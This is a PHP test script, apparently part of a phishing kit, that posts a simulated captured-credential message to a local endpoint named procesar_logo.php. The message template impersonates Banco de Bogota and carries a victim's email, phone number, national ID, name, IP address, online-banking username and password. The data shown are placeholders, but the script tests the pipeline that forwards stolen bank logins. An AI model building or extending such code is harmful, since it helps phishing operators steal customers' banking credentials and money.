<?php
// test_real_message.php - Simulate sending real user data to procesar_logo.php

$message = "
<b><u>💎BANCO DE BOGOTA 💎</u></b>
• <b>💌Correo:</b> test@example.com
• <b>📞Celular:</b> 1234567890
• <b>💸Cedula:</b> 1234567890
• <b>👤Persona:</b> Test User
• <b>🏦Banco:</b> BANCO DE BOGOTA
------------------------------
• <b>📟Dispositivo:</b> PC
• <b>🗺IP:</b> 127.0.0.1
• <b>⏱Hora:</b> " . date('d/m/Y H:i:s') . "
------------------------------
• <b>👤 Usuario:</b> 1234567890
• <b>🔑 Clave:</b> 1234
------------------------------";

$transactionId = 'test_real_' . time();

$formData = [
    'message' => $message,
    'transactionId' => $transactionId
];

$ch = curl_init('http://localhost:8000/data-ps/recargas/transaction/b-34f4/procesar_logo.php');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($formData),
    CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded']
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "HTTP Code: $httpCode\n";
echo "Response: $response\n";
?>